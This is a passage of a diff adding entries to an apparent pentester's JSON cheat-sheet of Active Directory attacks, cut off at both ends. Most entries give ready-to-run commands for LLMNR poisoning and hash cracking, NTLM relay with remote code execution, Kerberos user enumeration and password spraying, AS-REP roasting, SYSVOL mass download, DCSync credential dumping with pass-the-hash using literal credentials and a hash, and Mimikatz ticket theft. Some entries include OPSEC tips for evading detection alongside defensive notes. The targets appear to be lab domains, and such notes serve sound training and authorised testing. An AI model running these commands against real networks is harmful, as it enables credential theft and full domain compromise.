Even if the Administrator changes their password, your Golden Ticket remains valid because it is signed by&nbsp;<code>krbtgt</code>. The only way to invalidate it is to change the&nbsp;<code>krbtgt</code>account password twice.</p></li></ul><p></p>",
+    "tags": [
+      "AD",
+      "Golden_Ticket",
+      "Kerberos",
+      "AD",
+      "Mimikatz",
+      "Lateral_Movement",
+      "Persistence",
+      "Pass_The_Ticket",
+      "AD_Attacking"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "fb791f76-d4c0-4458-9028-992c01248f4b",
+    "label": "SMB LLMNR Poisoning & HashCat Cracking",
+    "command": "sudo responder -I eth2 -dwv \n# ensure SMB enabled \n#then on victim, go in file folder to \\\\attacker_ip , you get ntlm hashes on attacker\nhashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "<ul><li><p><strong>Description:</strong></p><ul><li><p>This flow executes a Man-in-the-Middle (MitM) attack by poisoning LLMNR, NBT-NS, and MDNS broadcast protocols to answer name resolution queries.</p></li><li><p><strong>Responder</strong>&nbsp;acts as a rogue server, spinning up multiple listeners (SMB, HTTP, SQL) to intercept authentication attempts from victims on the local network.</p></li><li><p>Using the&nbsp;<code>-dwv</code>&nbsp;flags enables more aggressive interception, including rogue WPAD proxy support and DHCP poisoning to capture broader traffic.</p></li><li><p>When a victim navigates to a UNC path or fails to resolve a hostname, Responder provides its own IP, forcing the victim to send NTLMv2 hashes during the handshake.</p></li><li><p>Once captured,&nbsp;<strong>Hashcat</strong>&nbsp;is used to perform high-speed offline dictionary attacks against these hashes to recover cleartext passwords.</p></li><li><p>Specifically,&nbsp;<code>-m 5600</code>&nbsp;is used for NTLMv2 hashes (common for Responder), while&nbsp;<code>-m 1000</code>&nbsp;targets standard NTLM hashes.</p></li><li><p>This combination is a classic vector for gaining initial credentials or moving laterally within Active Directory environments.</p></li></ul></li></ul><img src=\"local-file://profile-assets/offensive/screenshot-1767441002310.png\" alt=\"Screenshot\"><p></p>",
+    "tags": [
+      "AD",
+      "Impacket",
+      "Responder",
+      "Hashcat",
+      "NTLM",
+      "Credential_Dumping",
+      "Password_Cracking",
+      "MITM",
+      "Offline_Attack",
+      "AD",
+      "Windows",
+      "LLMNR"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "1d6a10a0-ae5e-4005-8037-c840128065de",
+    "label": "SMB Relay Attack Suite (Impacket)   / id:1",
+    "command": "# 1. Recon & Setup: Check SMB signing and config proxychains\nnmap --script=smb2-security-mode.nse -p445 10.0.2.73\necho 10.0.2.73 > targets.txt\nsudo sed -i 's/9050/1080/g' /etc/proxychains4.conf\n\n# 2. Attack Execution (Choose one method below)\n\n# Option A: SOCKS Tunneling (For manual tool usage)\nimpacket-ntlmrelayx -tf targets.txt -smb2support -socks\n# (In new terminal) proxychains impacket-secretsdump -no-pass DOMAIN/USER@10.0.2.73\n\n# Option B: Automated Hash Dumping (SAM/LSA)\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# Option C: RCE (Command or Payload)\nimpacket-ntlmrelayx -tf targets.txt -smb2support -c \"whoami /all\"\n# impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe\n\n# Option D: Interactive File System\nimpacket-ntlmrelayx -tf targets.txt -smb2support -i\n# (In new terminal) nc 127.0.0.1 11000",
+    "description": "<h3>1. Tool &amp; Attack Description</h3><p>This attack utilizes <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-ntlmrelayx</strong></span>, a powerful tool within the Impacket suite, to perform NTLM Relaying against SMB services. The core mechanism involves intercepting an NTLM authentication attempt from a victim machine and relaying that authentication to a target server where <strong>SMB Signing is disabled or not required</strong>. Instead of cracking the hash, the attacker \"passes\" the captured NetNTLMv2 hash directly to the target, gaining access within the context of the victim user (often a local admin). This specific workflow covers enumeration, SOCKS tunneling, automated SAM dumping, and Remote Code Execution (RCE).</p><h3>2. Tool location/source</h3><p><strong>Impacket</strong> comes pre-installed on Kali Linux and Parrot OS. <br>Path: <code>/usr/bin/impacket-ntlmrelayx</code> or <code>/usr/share/doc/python3-impacket/examples/ntlmrelayx.py</code>. <br>Source: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/fortra/impacket\">GitHub Repository</a>.</p><h3>3. Attack Prerequisites</h3><ul><li><p>The target machine must have <strong>SMB Signing Disabled</strong> or set to \"Enabled\" but not \"Required\".</p></li><li><p>The attacker must be on the same local network to perform LLMNR/NBT-NS poisoning or receive coerced authentication.</p></li><li><p>The victim user credentials being relayed must have administrative privileges on the target machine for operations like SAM dumping or RCE.</p></li></ul><h3>4. How attack works (step by step)</h3><ol><li><p><strong>Reconnaissance:</strong> The attacker scans the network to identify hosts on <span style=\"color: rgb(59, 130, 246);\">port 445</span> that do not enforce SMB signing using <code>nmap</code>.</p></li><li><p><strong>Listener Setup:</strong> The attacker starts <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-ntlmrelayx</strong></span> with a list of vulnerable targets. The tool listens for incoming HTTP/SMB connections.</p></li><li><p><strong>Interception:</strong> A victim machine attempts to authenticate to the attacker's machine (often triggered via Responder, MitM6, or coercion techniques).</p></li><li><p><strong>Relay:</strong> <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-ntlmrelayx</strong></span> forwards the captured NTLM challenge/response packets to the target server defined in <code>targets.txt</code>.</p></li><li><p><strong>Execution:</strong> Upon successful authentication, the tool executes the specified action: creating a SOCKS proxy, dumping the SAM database, or executing a command.</p></li></ol><h3>5. What attacker gains</h3><ul><li><p><strong>Lateral Movement:</strong> Access to the target system without knowing the plaintext password.</p></li><li><p><strong>Credential Theft:</strong> Ability to dump local SAM hashes and LSA secrets (requires Admin rights).</p></li><li><p><strong>RCE:</strong> Full command execution or interactive shell access on the target.</p></li></ul><h3>6. Detection/Defense/OPSEC</h3><ul><li><p><strong>Defense:</strong> Enforce SMB Signing (GPO: \"Microsoft network server: Digitally sign communications (always)\").</p></li><li><p><strong>Detection:</strong> Monitor for NTLM logins from unexpected workstations (the attacker's IP) rather than the actual user's source.</p></li><li><p><strong>OPSEC:</strong> This is a noisy network attack; the SOCKS proxy option allows for quieter, manual post-exploitation compared to automated spraying.</p></li></ul><h3>7. MITRE / OWASP category</h3><ul><li><p><strong>MITRE:</strong> T1557.001 (LLMNR/NBT-NS Poisoning and Relay), T1212 (Exploitation for Credential Access).</p></li><li><p><strong>OWASP:</strong> Identification and Authentication Failures.</p></li></ul><p></p>",
+    "tags": [
+      "SMB_Relay",
+      "Impacket",
+      "NTLM",
+      "Credential_Dumping",
+      "Lateral_Movement",
+      "RCE",
+      "SOCKS",
+      "Proxychains",
+      "Windows",
+      "Interactive_Shell",
+      "AD"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "9a508a02-2579-4533-b3d1-d64249d3d799",
+    "label": "enum4linux  SMB Enumeration Wrapper",
+    "command": "# Basic verbose enumeration (Run All options) against a target\n# -a : Do all simple enumeration (-U -S -G -P -r -o -n -i)\nenum4linux -a <TARGET_IP>\n\n# Enumeration with known credentials (Authenticated Scan)\n# -u : Username\n# -p : Password\nenum4linux -u <USER> -p <PASSWORD> -a <TARGET_IP>\n\n# Specific User Enumeration via RID Cycling (Useful to find valid usernames)\n# -r : RID cycle\nenum4linux -r <TARGET_IP>",
+    "description": "<p><strong>enum4linux</strong> is a specialized Perl script designed to detect and enumerate information from <span style=\"color: rgb(46, 134, 193);\"><strong>Windows</strong></span> and <span style=\"color: rgb(230, 126, 34);\"><strong>Samba</strong></span> systems. It acts as a wrapper around standard Samba tools like <code>smbclient</code>, <code>rpcclient</code>, <code>net</code>, and <code>nmblookup</code> to automate the extraction of critical data during the <strong>Enumeration</strong> phase.</p><p>This tool is particularly powerful for identifying:</p><ul><li><p><span style=\"color: rgb(192, 57, 43);\"><strong>Usernames</strong></span> (via RID cycling)</p></li><li><p><strong>Share lists</strong> (disk shares, printer shares, IPC$)</p></li><li><p><strong>Group memberships</strong></p></li><li><p><strong>Password policies</strong> (complexity, lockout thresholds)</p></li><li><p><strong>OS information</strong></p></li></ul><p>It frequently leverages <span style=\"color: rgb(142, 68, 173);\"><strong>Null Sessions</strong></span> to gather information without valid credentials, though it also supports authenticated enumeration. It is a staple in the OSCP methodology for identifying potential attack surfaces on port <span style=\"color: rgb(37, 99, 235);\"><strong>139</strong> and <strong>445</strong>.</span></p>",
+    "tags": [
+      "Enumeration",
+      "SMB",
+      "Windows",
+      "Reconnaissance",
+      "Null_Session"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "5b2613f0-edfc-4e27-bbe7-c075c6dd6b5b",
+    "label": "Kerberos User Enumeration via Kerbrute",
+    "command": "# Basic Kerberos username enumeration\n# Syntax: ./kerbrute userenum --dc <DC_IP> -d <DOMAIN> <WORDLIST>\n\n# Note: Ensure you have the correct IP for the Domain Controller to avoid timeout errors\n./kerbrute_linux_amd64 userenum \\\n  --dc 10.80.158.159 \\\n  -d spookysec.local \\\n  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n\n# Pro-Tip: If you want to check a specific list of passwords against a known user list later:\n# ./kerbrute_linux_amd64 passwordspray -d spookysec.local valid_users.txt \"Password123!\"",
+    "description": "<h3>1. Tool &amp; Attack Description</h3><p>This command utilizes <span style=\"color: rgb(239, 68, 68);\"><strong>#kerbrute</strong></span>, a popular tool written in Go, to perform <strong>User Enumeration</strong> against an Active Directory Domain Controller. Unlike traditional brute-forcing that sends passwords over SMB or LDAP, <span style=\"color: rgb(239, 68, 68);\"><strong>#kerbrute</strong></span> leverages the <strong>Kerberos Pre-Authentication</strong> mechanism. It sends AS-REQ requests for a list of potential usernames. The KDC (Key Distribution Center) responds differently depending on whether the principal exists in the database, allowing the attacker to validate usernames without sending passwords and often avoiding \"Account Lockout\" events associated with failed logins (though it generates pre-auth failure logs).</p><h3>2. Tool location/source</h3><p><strong>Kerbrute</strong> is not installed by default in all versions of Kali Linux but is a standard tool in a pentester's arsenal. It is distributed as a standalone binary. <strong>Source:</strong> <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/ropnop/kerbrute/releases\">https://github.com/ropnop/kerbrute/releases</a><strong>Typical Path:</strong> Users often place the binary in <code>/opt/kerbrute/</code> or <code>/usr/local/bin/kerbrute</code>.</p><h3>3. Attack Prerequisites</h3><ul><li><p>Network connectivity to the Target Domain Controller on Port <span style=\"color: blue;\">88</span> (TCP/UDP).</p></li><li><p>Knowledge of the correct <strong>Domain Name</strong> (e.g., spookysec.local) and <strong>DC IP</strong>.</p></li><li><p>A comprehensive username wordlist (e.g., SecLists or gathered via OSINT).</p></li></ul><h3>4. How attack works (step by step)</h3><ol><li><p>The attacker runs <span style=\"color: rgb(239, 68, 68);\"><strong>#kerbrute</strong></span> with the <code>userenum</code> flag and a list of potential usernames.</p></li><li><p>The tool iterates through the list, sending a Kerberos <strong>AS-REQ</strong> (Authentication Service Request) for each username to the DC on Port <span style=\"color: blue;\">88</span>.</p></li><li><p>Crucially, the tool does <strong>not</strong> send an encrypted timestamp (pre-authentication data) in this first request.</p></li><li><p>If the user <strong>does not exist</strong>, the DC responds with the error code <code>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</code>.</p></li><li><p>If the user <strong>exists</strong> and requires pre-authentication, the DC responds with <code>KRB5KDC_ERR_PREAUTH_REQUIRED</code>, confirming the account is valid.</p></li><li><p>If the user exists but has <strong>\"Do not require Kerberos preauthentication\"</strong> enabled, the DC returns an AS-REP with a TGT, alerting the attacker to an <strong>AS-REP Roasting</strong> vulnerability.</p></li></ol><h3>5. What attacker gains</h3><ul><li><p>A validated list of <strong>active Active Directory usernames</strong>.</p></li><li><p>Identification of accounts vulnerable to <strong>AS-REP Roasting</strong> (hashes that can be cracked offline).</p></li><li><p>A cleaner target list for subsequent Password Spraying attacks, reducing the risk of locking out random accounts.</p></li></ul><h3>6. Detection/Defense/OPSEC</h3><ul><li><p><strong>Defense:</strong> Implement strict monitoring on Event ID <strong>4768</strong> (Kerberos Authentication Service was requested).</p></li><li><p><strong>Detection:</strong> A high volume of AS-REQ requests from a single IP address with result codes <code>0x6</code> (Principal Unknown) indicates enumeration.</p></li><li><p><strong>OPSEC:</strong> While \"stealthier\" than SMB spraying, this is <strong>not silent</strong>. It generates massive logs on the DC. Use the <code>--delay</code> flag or perform slowly to avoid heuristic detection.</p></li></ul><h3>7. MITRE / OWASP category</h3><ul><li><p><strong>MITRE ATT&amp;CK:</strong> T1589.002 (Gather Victim Identity Information: Email Addresses) / T1087.002 (Account Discovery: Domain Account).</p></li><li><p><strong>OWASP:</strong> Identification and Authentication Failures.</p></li></ul><p></p>",
+    "tags": [
+      "AD",
+      "Kerberos",
+      "Enumeration",
+      "Initial_Access",
+      "Windows",
+      "AD_Attacking",
+      "Password_Spraying"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "de17c0ad-2b3c-4b48-93ba-638fdeb87f20",
+    "label": "AS-REP Roasting via Impacket GetNPUsers and Hashcat",
+    "command": "# Step 1: Request the TGT hash for a specific user (or use -usersfile for a list)\n# Note: -request flag is mandatory to retrieve the hash. -no-pass prevents a password prompt.\nimpacket-GetNPUsers spookysec.local/username -dc-ip 10.80.167.130 -request -no-pass -format hashcat -outputfile attractive-kerb-hash.txt\n\n# Step 2: Crack the captured hash offline\n# Mode 18200 = Kerberos 5, etype 23, AS-REP\nhashcat -m 18200 attractive-kerb-hash.txt /usr/share/wordlists/rockyou.txt --force",
+    "description": "<h3>1. Tool &amp; Attack Description</h3><p>This attack chain utilizes <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-GetNPUsers</strong></span> from the Impacket suite and <span style=\"color: rgb(239, 68, 68);\"><strong>#hashcat</strong></span> to perform <strong>AS-REP Roasting</strong>. This technique exploits Active Directory users who have the property <code>DONT_REQ_PREAUTH</code> enabled. Because these accounts do not require Kerberos pre-authentication, the Domain Controller will send an AS-REP message (encrypted with the user's password-derived key) to anyone who requests it, without requiring the attacker to provide a password first. The attacker captures this encrypted ticket and attempts to crack it offline to recover the user's plaintext password.</p><h3>2. Tool location/source</h3><p><strong>Impacket:</strong> typically pre-installed on Kali Linux. Path: <code>/usr/share/doc/python3-impacket/examples/GetNPUsers.py</code> or simply available in PATH as <code>impacket-GetNPUsers</code>. Source: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/fortra/impacket\">https://github.com/fortra/impacket</a></p><p><strong>Hashcat:</strong> standard on Kali Linux. Path: <code>/usr/bin/hashcat</code> Source: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/hashcat/hashcat\">https://github.com/hashcat/hashcat</a></p><h3>3. Attack Prerequisites</h3><ul><li><p>Network connectivity to the Domain Controller (specifically port <span style=\"color: rgb(0, 0, 255);\">88/TCP</span> Kerberos).</p></li><li><p>A valid domain name and at least one known username (or a list of users to enumerate).</p></li><li><p>At least one user account in the target AD must have \"Do not require Kerberos preauthentication\" enabled.</p></li><li><p>No existing credentials are required to initiate the attack (unlike Kerberoasting).</p></li></ul><h3>4. How attack works (step by step)</h3><ol><li><p>The attacker uses <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-GetNPUsers</strong></span> to send an AS-REQ (Authentication Service Request) to the Key Distribution Center (KDC) for a specific user or list of users.</p></li><li><p>The KDC checks the user account properties. If <code>DONT_REQ_PREAUTH</code> is set, the KDC does <strong>not</strong> require the user to encrypt a timestamp with their password first.</p></li><li><p>The KDC immediately responds with an AS-REP message containing the TGT (Ticket Granting Ticket). Crucially, part of this message is encrypted using the user's NTLM hash (derived from their password).</p></li><li><p>The tool saves this encrypted blob (AS-REP hash) to a file.</p></li><li><p>The attacker uses <span style=\"color: rgb(239, 68, 68);\"><strong>#hashcat</strong></span> with mode <code>18200</code> to brute-force the encrypted blob against a wordlist, attempting to match the password that decrypts the ticket.</p></li></ol><h3>5. What attacker gains</h3><ul><li><p><strong>Valid User Credentials:</strong> Recovery of the plaintext password for the target account.</p></li><li><p><strong>Initial Access:</strong> Often used to gain the first foothold in a domain if the roasted user is externally accessible (e.g., VPN/Outlook).</p></li><li><p><strong>Lateral Movement:</strong> If the user is a service account or admin, it enables movement across the network.</p></li></ul><h3>6. Detection/Defense/OPSEC</h3><ul><li><p><strong>Defense:</strong> Ensure<strong> \"Do not require Kerberos preauthentication\"</strong> is <span style=\"color: rgb(220, 38, 38);\">unchecked</span> for all users (it is off by default).</p></li><li><p><strong>Detection:</strong> Monitor Windows Event ID <strong>4768</strong> (A Kerberos authentication ticket (TGT) was requested) where Pre-Authentication Type is 0 or missing, especially from non-standard IPs.</p></li><li><p><strong>OPSEC:</strong> High traffic volume if enumerating thousands of users; relatively stealthy if targeting a single user, but the AS-REQ is logged.</p></li></ul><h3>7. MITRE / OWASP category</h3><ul><li><p><strong>MITRE ATT&amp;CK:</strong> T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)</p></li><li><p><strong>Tactic:</strong> Credential Access</p></li></ul><p></p>",
+    "tags": [
+      "AD",
+      "Impacket",
+      "Hashcat",
+      "ASREPRoast",
+      "Credential_Dumping",
+      "Offline_Attack",
+      "Kerberos",
+      "Windows",
+      "Password_Cracking",
+      "Initial_Access",
+      "Enumeration",
+      "AS-REP_Roasting",
+      "AD_Attacking"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "e0ea97ee-22da-4c45-82f2-3b245812d0a6",
+    "label": "smbclient (Data Exfiltration from SMB Shares)",
+    "command": "smbclient \\\\\\\\attacktivedirectory\\\\SYSVOL -U spookysec.local/svc-admin management2005\n\n\nsmb: \\> prompt off    # Disable confirmation prompts for mget\nsmb: \\> recurse on    # Enable directory recursion\nsmb: \\> mget * # Download everything from current directory recursively",
+    "description": "<h3>1. Tool &amp; Attack Description</h3><p>The tool used here is <span style=\"color: rgb(239, 68, 68);\"><strong>#smbclient</strong></span>, a command-line client part of the Samba suite, similar to an FTP client but for SMB/CIFS access. This specific attack chain demonstrates an <strong>authenticated mass exfiltration</strong> technique targeting the <span style=\"color: rgb(239, 68, 68);\"><strong>SYSVOL</strong></span> share on a Domain Controller. By connecting with valid credentials, disabling interactive prompts, and enabling recursion, the attacker attempts to download the entire directory structure. This is critical in Active Directory assessments because <strong>SYSVOL</strong> contains Group Policy Objects (GPOs), logon scripts, and sometimes legacy Group Policy Preferences (GPP) XML files containing reversible cPasswords.</p><h3>2. Tool location/source</h3><p><span style=\"color: rgb(239, 68, 68);\"><strong>#smbclient</strong></span> is native to most Linux penetration testing distributions. <strong>Location:</strong> <code>/usr/bin/smbclient</code> <strong>Availability:</strong> Pre-installed on Kali Linux, Parrot OS, and standard repositories (<code>apt install smbclient</code>).</p><h3>3. Attack Prerequisites</h3><ul><li><p>Valid domain credentials (username and password or NTLM hash).</p></li><li><p>Network connectivity to the target on <span style=\"color: rgb(59, 130, 246);\"><strong>445/TCP</strong></span> (SMB).</p></li><li><p>Read permissions on the target share (SYSVOL is readable by all Authenticated Users by default).</p></li></ul><h3>4. How attack works (step by step)</h3><ol><li><p>The attacker establishes an authenticated SMB session to the target share using <span style=\"color: rgb(239, 68, 68);\"><strong>#smbclient</strong></span>.</p></li><li><p>Inside the interactive shell, the attacker runs <code>prompt off</code> to disable the interactive \"Y/N\" confirmation for every single file download.</p></li><li><p>The command <code>recurse on</code> is executed to toggle recursion, allowing the tool to traverse into subdirectories.</p></li><li><p>Finally, <code>mget *</code> initiates the mass download of all files and folders from the remote share to the attacker's local machine.</p></li></ol><p></p><h3>5. What attacker gains</h3><ul><li><p><strong>Information Disclosure:</strong> Access to network scripts, setup files, and configuration data.</p></li><li><p><strong>Credential Harvesting:</strong> Potential recovery of hardcoded credentials in scripts or GPP XML files (MS14-025).</p></li><li><p><strong>Internal Recon:</strong> Insight into domain policies and software deployment paths.</p></li></ul><h3>6. Detection/Defense/OPSEC</h3><ul><li><p><strong>Defense:</strong> Ensure MS14-025 patches are applied; remove XML files with cPasswords from SYSVOL.</p></li><li><p><strong>Detection:</strong> Monitor for massive read operations on SYSVOL (Event ID 5140/5145) from non-standard workstations.</p></li><li><p><strong>OPSEC:</strong> Downloading thousands of files generates significant network noise and logs.</p></li></ul><h3>7. MITRE / OWASP category</h3><ul><li><p><strong>MITRE ATT&amp;CK:</strong> T1039 (Data from Network Shared Drive), T1552.006 (Group Policy Preferences).</p></li><li><p><strong>OWASP:</strong> Sensitive Data Exposure.</p></li></ul><p></p>",
+    "tags": [
+      "SMB",
+      "Enumeration",
+      "Windows",
+      "Linux",
+      "AD",
+      "Credential_Dumping",
+      "SYSVOL",
+      "GPP",
+      "Initial_Access"
+    ],
+    "color": "#ec4899"
+  },
+  {
+    "id": "d5944e51-7ce4-4bef-beaf-029c043b1127",
+    "label": "Domain Credential Dump to Pass-the-Hash Shell",
+    "command": "impacket-secretsdump spookysec.local/backup:backup2517860@attacktivedirectory\n\nevil-winrm -i attacktivedirectory -u administrator -H 0e0363213e37b94221497260b0bcb4fc\n\n#replace attacktivedirectory with your AD or machine IP",
+    "description": "<p><strong>1. Tool &amp; Attack Description:</strong> This attack chain combines two powerful offensive tools to escalate privileges and gain remote execution. First, <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-secretsdump</strong></span> is used to remotely dump the domain controller's credentials (typically extracting the <strong>NTDS.dit</strong> database) using valid, high-privileged user credentials. Once the NTLM hashes are retrieved, the attacker utilizes <span style=\"color: rgb(239, 68, 68);\"><strong>#evil-winrm</strong></span> to perform a <strong>Pass-the-Hash (PtH)</strong> attack. This allows authentication as the Domain Administrator without ever needing to crack the password, granting a fully interactive PowerShell shell.</p><p><strong>2. Tool location/source:</strong> Both tools are standard in the <strong>Kali Linux</strong> repository.</p><ul><li><p><strong>Impacket:</strong> Typically located at <code>/usr/bin/impacket-secretsdump</code> or in the python examples directory. Source: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/fortra/impacket\">Impacket GitHub</a>.</p></li><li><p><strong>Evil-WinRM:</strong> Installed via Ruby Gems or apt. Location: <code>/usr/bin/evil-winrm</code>. Source: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/Hackplayers/evil-winrm\">Evil-WinRM GitHub</a>.</p></li></ul><p><strong>3. Attack Prerequisites:</strong></p><ul><li><p>Valid credentials for a user with high privileges (e.g., Domain Admin or specific <strong>DCSync</strong> rights like 'Replicating Directory Changes').</p></li><li><p>Network access to the Domain Controller on <span style=\"color: blue;\">TCP 445</span> (SMB) and <span style=\"color: blue;\">TCP 135</span> (RPC) for dumping.</p></li><li><p>The target must have the Windows Remote Management (WinRM) service enabled and listening on <span style=\"color: blue;\">TCP 5985</span> (HTTP) or <span style=\"color: blue;\">TCP 5986</span> (HTTPS).</p></li></ul><p><strong>4. How attack works (step by step):</strong></p><ol><li><p>The attacker executes <span style=\"color: rgb(239, 68, 68);\"><strong>#impacket-secretsdump</strong></span> against the Domain Controller using the compromised credentials of the user 'backup'.</p></li><li><p>The tool connects via RPC/SMB and requests a replication of the domain credentials (DCSync) or dumps the LSA/SAM secrets if running against a local host.</p></li><li><p>The output reveals the NTLM hash of the built-in <strong>Administrator</strong> account.</p></li><li><p>Using <span style=\"color: rgb(239, 68, 68);\"><strong>#evil-winrm</strong></span>, the attacker passes the captured Administrator hash (Pass-the-Hash) to the WinRM service.</p></li><li><p>The server validates the hash challenge without requiring the plaintext password, granting a remote shell session.</p></li></ol><p><strong>5. What attacker gains:</strong></p><ul><li><p>Full <strong>Domain Admin</strong> level access to the network.</p></li><li><p>A stable, interactive PowerShell terminal on the Domain Controller.</p></li><li><p>Ability to execute further post-exploitation tasks (Golden Ticket creation, persistence).</p></li></ul><p><strong>6. Detection/Defense/OPSEC:</strong></p><ul><li><p>Monitor for <strong>DRSUAPI</strong> replication traffic (Event ID 4662) coming from non-DC IP addresses.</p></li><li><p>Alert on WinRM logins (Event ID 4624, Logon Type 3) using the Administrator account from anomalous workstations.</p></li><li><p>Disable WinRM on endpoints where it is not strictly required.</p></li></ul><p><strong>7. MITRE / OWASP category:</strong></p><ul><li><p><strong>T1003.006:</strong> OS Credential Dumping: DCSync.</p></li><li><p><strong>T1550.002:</strong> Use Alternate Authentication Material: Pass the Hash.</p></li><li><p><strong>T1021.006:</strong> Remote Services: Windows Remote Management.</p></li></ul><p></p><p></p><img src=\"local-file://profile-assets/offensive/0cc71676-fc68-4b2a-920f-61f69415eb23.png\" alt=\"Pasted Image\"><p></p><p></p><p></p>",
+    "tags": [
+      "Impacket",
+      "CrackMapExec",
+      "Credential_Dumping",
+      "DCSync",
+      "Pass_The_Hash",
+      "Lateral_Movement",
+      "Windows",
+      "AD",
+      "Remote_Access",
+      "WinRM",
+      "NTDS",
+      "Administrator",
+      "SMB"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "82f195ac-1f2f-4bb3-991c-f951875af9c1",
+    "label": "Export and Pass-the-Ticket for Lateral Movement via Mimikatz.",
+    "command": "# 1. Start Mimikatz with admin rights\n#mimikatz.exe\n\n# 2. Enable debug privileges to interact with LSASS\nprivilege::debug\n\n# 3. Export all Kerberos tickets from memory to current directory as .kirbi files\nsekurlsa::tickets /export\n\n# 4. Inject the stolen ticket into the current session\n# Replace the filename with the specific one exported in step 3\nkerberos::ptt \"[0;2a9c8a]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi\"\n\n# 5. Exit Mimikatz\nexit\n\n# 6. Verify the ticket is loaded in the current command prompt session\nklist\n\n# 7. Access the Domain Controller share using the injected ticket\ndir \\\\CONTROLLER.LOCAL\\C$",
+    "description": "<h3>1. Tool &amp; Attack Description</h3><p>The attack demonstrates <strong>Post-Exploitation Credential Harvesting</strong> and <strong>Lateral Movement</strong> using the world-renowned <span style=\"color: rgb(239, 68, 68);\"><strong>#mimikatz</strong></span>. By leveraging the <code>sekurlsa::tickets /export</code> module, an attacker extracts Kerberos tickets (TGTs and TGSs) directly from the memory of the <span style=\"color: rgb(239, 68, 68);\"><strong>#LSASS</strong></span> process. Once exported as <code>.kirbi</code> files, these tickets are reinjected into the current session using the <strong>Pass-the-Ticket (PtT)</strong> technique via the <code>kerberos::ptt</code> command. This allows the attacker to impersonate the identity (e.g., <strong>Administrator</strong>) associated with the ticket without ever knowing the user's plaintext password, facilitating unauthorized access to remote resources like Domain Controllers.</p><h3>2. Tool location/source</h3><p>The binary <span style=\"color: rgb(239, 68, 68);\"><strong>#mimikatz.exe</strong></span> is typically found on <strong>Kali Linux</strong> at <code>/usr/share/mimikatz/</code>. For Windows deployments, it is usually downloaded from the official GitHub repository: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/gentilkiwi/mimikatz/releases\">gentilkiwi/mimikatz</a>.</p><h3>3. Attack Prerequisites</h3><ul><li><p><strong>Local Administrator</strong> or <strong>SYSTEM</strong> privileges on the compromised host to interact with LSASS.</p></li><li><p>The <code>SeDebugPrivilege</code> must be enabled (achieved via <code>privilege::debug</code>).</p></li><li><p>A target user (e.g., Domain Admin) must have an active or recent session on the machine to ensure their tickets are in memory.</p></li><li><p>Access to the <span style=\"color: rgb(239, 68, 68);\"><strong>#mimikatz.exe</strong></span> binary on the victim file system.</p></li></ul><h3>4. How attack works (step by step)</h3><ol><li><p>The attacker executes <span style=\"color: rgb(239, 68, 68);\"><strong>#mimikatz.exe</strong></span> on a compromised Windows workstation.</p></li><li><p>The command <code>privilege::debug</code> is issued to obtain necessary permissions to read the memory of high-privileged system processes.</p></li><li><p>The <code>sekurlsa::tickets /export</code> command is run to scrape Kerberos tickets from the <span style=\"color: rgb(239, 68, 68);\"><strong>#LSASS</strong></span> process memory and save them as local files.</p></li><li><p>The attacker identifies a high-value ticket (e.g., a TGT for a Domain Administrator) among the exported files.</p></li><li><p>Using <code>kerberos::ptt</code>, the attacker injects the specific <code>.kirbi</code> ticket into their current memory session.</p></li><li><p>The attacker verifies the presence of the ticket using the native Windows command <span style=\"color: rgb(239, 68, 68);\"><strong>#klist</strong></span>.</p></li><li><p>Finally, the attacker accesses remote shares (e.g., <code>C$</code> on the Domain Controller) using the impersonated identity.</p></li></ol><h3>5. What attacker gains</h3><ul><li><p>Unauthorized access to remote systems and sensitive data using a <strong>Pass-the-Ticket</strong> approach.</p></li><li><p>Ability to bypass <strong>Multi-Factor Authentication (MFA)</strong> if only the Kerberos token is required for the service.</p></li><li><p>Potential for <strong>Full Domain Compromise</strong> if a Domain Admin TGT is captured.</p></li></ul><h3>6. Detection/Defense/OPSEC</h3><ul><li><p>Monitor for the <code>SeDebugPrivilege</code> being enabled by non-standard processes (Event ID 4673).</p></li><li><p>Enable <strong>Credential Guard</strong> on Windows 10/11 and Server 2016+ to protect LSASS memory.</p></li><li><p>Detect <span style=\"color: rgb(239, 68, 68);\"><strong>#mimikatz</strong></span> strings in memory or command-line logs (Event ID 4688).</p></li><li><p>Restrict <strong>Local Administrator</strong> access to prevent unauthorized memory reads.</p></li></ul><h3>7. MITRE / OWASP category</h3><ul><li><p><strong>MITRE ATT&amp;CK:</strong> T1550.003 (Use Alternate Authentication Material: Pass the Ticket).</p></li><li><p><strong>MITRE ATT&amp;CK:</strong> T1003.001 (OS Credential Dumping: LSASS Memory).</p></li></ul><p></p>",
+    "tags": [
+      "AD",
+      "mimikatz",
+      "Credential_Dumping",
+      "Pass_The_Ticket",
+      "Kerberos",
+      "Windows",
+      "Lateral_Movement",
+      "Privilege_Escalation",
+      "LSASS",
+      "Initial_Access",
+      "AD_Attacking",
+      "Windows_Attacking"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "456dbbec-d9c1-491c-b27f-3e9c9ca1b39f",
+    "label": "Basic enumeration with PowerView",
